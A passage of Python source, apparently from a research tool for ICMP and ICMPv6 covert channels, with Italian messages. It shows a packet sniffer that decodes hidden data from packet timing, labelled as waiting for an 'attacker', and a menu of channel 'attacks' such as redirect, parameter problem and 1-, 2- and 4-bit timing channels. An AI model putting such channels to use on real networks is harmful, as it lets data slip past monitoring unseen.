            filter= f"icmp6 and (icmp6[0]=={TYPE_INFORMATION_REQUEST} or icmp6[0]=={TYPE_INFORMATION_REPLY}) and dst {ip_dst.compressed}" 
            if IS_TYPE.ipaddress(ip_src): 
                filter+=f" and src {ip_src.compressed}"
        except Exception as e:
            raise Exception(f"Exception: {e}") 
        try: 
            args={
                "filter": filter
                #,"count":1 
                ,"prn": CALLBACK.callback_v6_timing_cc(
                    callback_function
                    ,event_pktconn
                    ,timer_timing_CC
                    ,timing_data
                    ,last_packet_time
                    ,numero_bit
                )
                #,"store":True 
                ,"iface":interface
            } 
            sniffer,pkt_timer=SNIFFER.sniff_packet(
                args
                ,None
                ,lambda: SNIFFER.template_timeout(event_pktconn)
            ) 
            THREADING_EVENT.wait(event_pktconn)   
            str_data=""
            for integer in timing_data:
                str_data+=format(integer, f'0{numero_bit}b') 
            data="" 
            for index in range(0, len(str_data), 8):
                int_data=0
                for bit in str_data[index:index+8][::-1]:
                    int_data=int_data<<1|int(bit)
                data+=chr(int_data)  
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        SNIFFER.stop(sniffer)
        if TIMER.stop(pkt_timer): 
            joined="".join(timing_data)
            cleaned="".join(x for x in joined if x in string.printable)
            final_data.append(cleaned) 
            print(f"Done waiting 'parameter_problem' received: {final_data}") 
            return True 
        return False


class AttackType():
    attack_dict={ 
         "ipv4_1":"ipv4_destination_unreachable"
        ,"ipv4_2":"ipv4_source_quench"
        ,"ipv4_3":"ipv4_redirect"
        ,"ipv4_4":"ipv4_timing_channel_1bit"
        ,"ipv4_5":"ipv4_timing_channel_2bit" 
        ,"ipv4_6":"ipv4_timing_channel_4bit" 

        ,"ipv4_7":"ipv4_time_exceeded"
        ,"ipv4_8":"ipv4_parameter_problem"
        ,"ipv4_9":"ipv4_timestamp_request"
        ,"ipv4_10":"ipv4_timestamp_reply"
        ,"ipv4_11":"ipv4_information_request"
        ,"ipv4_12":"ipv4_information_reply"  

        ,"ipv6_1":"ipv6_destination_unreachable" 
        ,"ipv6_2":"ipv6_packet_to_big" 
        ,"ipv6_3":"ipv6_time_exceeded" 
        ,"ipv6_4":"ipv6_parameter_problem" 
        ,"ipv6_5":"ipv6_timing_channel_1bit" 
        ,"ipv6_6":"ipv6_timing_channel_2bit" 
        ,"ipv6_7":"ipv6_timing_channel_4bit"

        ,"ipv6_8":"ipv6_information_request"
        ,"ipv6_9":"ipv6_information_reply"  
    } 

    def get_attack_function(self, attack_name:str): 
        if not isinstance(attack_name,str) :
            raise Exception(f"Argomenti non corretti")
        try: 
            list_function_attack={}
            for key,val in self.attack_dict.items():
                if str(key)==str(attack_name) or str(val)==str(attack_name):
                    list_function_attack.update({key:val})  
            return list_function_attack
        except Exception as e:
            print(f"Exception: {e}") 
            return None

    def print_available_attacks(self):
        print("Gli attacchi disponibili sono:")
        for attack in self.attack_dict: 
            try:
                if "ipv4" in attack:
                    print(f"\t{attack.replace("ipv4_","")} -> {self.attack_dict[attack].replace("ipv4_","")} (IPv4)")
                elif "ipv6" in attack:
                    print(f"\t{attack.replace("ipv6_","")} -> {self.attack_dict[attack].replace("ipv6_","")} (IPv6)")
                else:
                    print(f"\t{attack} -> {self.attack_dict[attack]} (Unknown)")
            except Exception as e:
                print(f"Err:\t{attack} -> {self.attack_dict[attack]}")
                print(f"Errore nella stampa degli attacchi: {e}")
        print("Per scegliere un attacco, usa il nome o il numero corrispondente." \
            "\nAd esempio per l'attacco 'destination unreachable' in IPv4, puoi scegliere:" \
            "\n\t*il nome 'ipv4_destination_unreachable'" \
            "\n\t*il codice 'ipv4_3'." \
        )


def final_attemp():
    pass